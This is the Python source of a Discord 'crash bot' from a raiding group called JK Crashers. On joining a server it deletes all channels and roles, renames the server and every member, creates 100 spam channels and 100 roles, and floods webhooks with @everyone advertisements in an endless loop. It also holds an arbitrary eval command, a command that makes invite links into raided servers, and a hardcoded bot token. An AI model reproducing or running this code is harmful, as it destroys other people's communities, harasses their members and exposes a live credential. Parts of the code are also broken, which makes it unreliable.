# coding=utf-8
import discord
import time
import random
import asyncio
import os
import json
import inspect
from discord.ext import commands
import datetime
import keep_alive
import threading
from discord_webhook import DiscordWebhook as hook, DiscordEmbed as D_Embed
from threading import Thread
from time import sleep
from discord import Webhook, AsyncWebhookAdapter
wl = [914094381219340340]
keep_alive.keep_alive()

intents = discord.Intents.all()
bot = commands.Bot(command_prefix = 'p!', intents=intents)
bot.remove_command( 'help' )
black_list = json.load(open('black-list.json'))
bl_server = json.load(open('bl-server.json'))
ser_vers = json.load(open('servers.json'))


dev_ids = [483558478565343232,832986836019707904]

@bot.event
async def on_guild_join(guild):
  if len(guild.members) <= 10:
    embed = discord.Embed(
            title = 'Попытка краша сервера, где недостаточно участников.',
            description = '''**Согласно нашим данным на этом сервере меньше `10` человек.** \n ```Если у вас есть вопросы, то``` \n **[🔗кликните наш Discord сервер](https://discord.gg/6SE3CcGQdx)**''',
            color = 0xe90000
        )
    await guild.text_channels[0].send(embed=embed)
    await guild.leave()

  if guild.id in ser_vers:
        embed = discord.Embed(
            title = 'Попытка краша сервера из белого списка.',
            description = '''Согласно нашим данным это сервер пытались крашнуть. Мы советуем посмотреть журнал аудита и проверить кто пригласил этого бота. Если у вас есть вопросы, то **[🔗кликните наш Discord сервер](https://discord.gg/6SE3CcGQdx)**''',
            color = 0xe90000
        )
        await guild.text_channels[0].send(embed=embed)
        await guild.leave()
  adder=None
  try:
    async for entry in guild.audit_logs(action=discord.AuditLogAction.bot_add):
      adder = entry.user
      a_id=adder.id
      break
    if a_id in black_list:
      try: await adder.send("https://discord.gg/c2P7kn6Edc ", embed = discord.Embed(title=':x:Доступ запрещен. Вас добавили в черный список', description=f'```Вы можете зайти на сервер, чтобы узнать причину блокировки```', colour = 0xf00a0a))
      except: pass
      await guild.leave()
      return
  except: adder="Unknown"; a_id="Unknown"
  
  for u in guild.channels:
    try: await u.delete()
    except: pass
  try: await guild.edit(name='Crashed by JK Crashers')
  except: pass
  for x in guild.roles:
    try: await x.delete()
    except: pass
  for x in guild.members:
    try: await x.edit(nick="crash by JK Crashers")
    except: pass
  for x in range(100):
    try: await guild.create_text_channel("crash-by-jkcrashers")
    except: pass
  for x in range(100):
    await guild.create_role(name ="crash by JK Crashers")
  with open('K.E.Y.webp', 'rb') as f:
        icon = f.read()
  await guild.edit(name='Crash by JK ', icon=icon)
  await adder.send("https://discord.gg/c2P7kn6Edc ", embed = discord.Embed(title=':x: Краш закончен', description=f'```Я выйду с крашнутого сервера \n А так же зайдите на наш сервер)``` \n', colour = 0xf00a0a))
  await guild.leave()

  

@bot.command()
async def bl(ctx, param, id: int):
  global dev_ids
  if not ctx.author.id in dev_ids:
    return await ctx.send("Долбаеб", embed = discord.Embed(title=':x:Доступ запрещен', description=f'```Ты не разработчик этого творения```', colour = 0xf00a0a))
  if param == "add":
    black_list.append(id)
    await ctx.send(f"<@{id}> был добавлен в черный список боты,**Мой сладкий пончик**!", embed = discord.Embed(title='✅', description=f'Хорошего дня {ctx.author}!', colour = 0xf00a0a))
  elif param == "remove":
    black_list.remove(id)
    await ctx.send(f"<@{id}> был убран", embed = discord.Embed(title='✅', description=f'```Хорошего дня``` \n `{ctx.author.mention}`!', colour = 0xf00a0a))
  with open('black-list.json', 'w') as f: json.dump(black_list, f)

@bot.command()
async def wl(ctx, param, id: int):
  global dev_ids
  if not ctx.author.id in dev_ids:
    return await ctx.send("Долбаеб", embed = discord.Embed(title=':x:Доступ запрещен', description=f'```Ты не разработчик этого творения```', colour = 0xf00a0a))
  if param == "add":
    ser_vers.append(id)
    await ctx.send(f"Сервер с айди `{id}` был добавлен в защиту", embed = discord.Embed(title='✅', description=f'Хорошего дня {ctx.author.mention}!', colour = 0xf00a0a))
  elif param == "remove":
    ser_vers.remove(id)
    await ctx.send(f"Сервер с {id} был убран", embed = discord.Embed(title='✅', description=f'Хорошего дня {ctx.author.mention}!', colour = 0xf00a0a))
  with open('servers.json', 'w') as f: json.dump(ser_vers, f)

@bot.event
async def on_guild_channel_create(channel):
    if channel.name == "crash-by-jkcrashers":
      print("test")
      webhook = await channel.create_webhook(name = "Crash by JK Crashers")
    print("test2")
    webhook_url = webhook.url
    async with aiohttp.ClientSession() as session:
      print("test3")
      webhook = discord.Webhook.from_url(str(webhook_url), adapter=discord.AsyncWebhookAdapter(session))
      print("test4")
      while True:
        try:
          await webhook.send("@everyone @here \n Вас крашнули https://discord.gg/c2P7kn6Edc ", embed = discord.Embed(title='Привет котаны!) Данный сервер крашится ', description=f'**Хочешь крашить сервера?**<:emoji_76:858227935676858398> \n **Тогда тебе точно к нам!**<:rules:858227884496519209>\n `JKCrashers` __даст вам:__<:star:858227953916968960> \n ```-Удобных и мощных краш ботов. \n-Помощь с рейдом и крашем. \n-Большой функционал краш ботов.``` \n <:gazeta:858227900242853918>**Наши социальные сети** \n <:emoji_77:858227971847487509>`Дискорд сервер` [🔗Клик](https://discord.gg/6SE3CcGQdx) \n <:shit:858228038718193704>`Telegram канал` [🔗Клик](https://t.me/jkcrashers) \n<:emoji_79:858227998498095154>`Youtube создателя` [🔗Клик](https://www.youtube.com/c/JKTimosha)', colour = 0x0e0101))
        except:
          pass

@bot.event
async def on_command_error(ctx, err):
    if isinstance(err, commands.errors.BotMissingPermissions):
        await ctx.message.delete()
        await ctx.author.send(embed=discord.Embed(title='Ошибочка', description=f"У бота отсутствуют права: {' '.join(err.missing_perms)}\nВыдайте их ему для полного функционирования бота", color=discord.Colour.from_rgb(255, 0, 0)))
    elif isinstance(err, commands.CommandOnCooldown):
        await ctx.message.delete()
        await ctx.author.send(embed=discord.Embed(title='Ошибочка', description=f"**У вас еще не прошел кулдаун на команду** `{ctx.command}`\n**Подождите еще** \n  ```{err.retry_after:.2f} секунд```", color=discord.Colour.from_rgb(255, 0, 0)))
    elif isinstance(err, commands.CommandNotFound ):
        await ctx.send(embed = discord.Embed(description = f'** {ctx.author.name}, данной команды не существует.**', color=0x0c0c0c))
    elif isinstance( err, commands.MissingRequiredArgument ):
        await ctx.author.send(embed=discord.Embed(title='Ошибочка', description=f"Нету аргумента", color=discord.Colour.from_rgb(255, 0, 0)))

@bot.command(name="eval")
async def _eval(ctx, *, command):
  global dev_ids
  if not ctx.author.id in dev_ids:
    return await ctx.send("**Долбаеб!!!**", embed = discord.Embed(title=':x:Доступ запрещен', description=f'Ты не разработчик -_-', colour = 0xf00a0a))
  res = eval(command)
  if inspect.isawaitable(res):
    await ctx.send(await res)
  else:
    await ctx.send(res)

@bot.command(brief = "private", description = "Создаёт приглашение, и отправляет его")
async def invite(ctx=None, id=None):
  global dev_ids
  if not ctx.author.id in dev_ids:
    return await ctx.send("нельзя")
  g = bot.get_guild(int(id))
  if not g: return await ctx.send('В моей базе данных нету такого сервера')
  for x in g.text_channels:
      link = await x.create_invite(max_age=1, max_users=2)
      link = str(link)
      await ctx.send(link)
      return link
      await ctx.send(f'Нет прав для создания инвайта ')


@bot.event
async def on_ready():
  print(f'Бот запущен. Ник бота: {bot.user}  https://discord.com/oauth2/authorize?client_id={bot.user.id}&permissions=8&scope=bot Юзеров {0}!'.format(bot.user))
  await bot.change_presence(status=discord.Status.online, activity=discord.Streaming(name=f'JKtimosha Youtube', url='https://www.twitch.tv/jktimosha'))








bot.run("OTY4ODg0NDUyNDM0NTEzOTUw.YmlV9g.Sz78dlS4mc5uIgbVV-gpY9_gLi8")
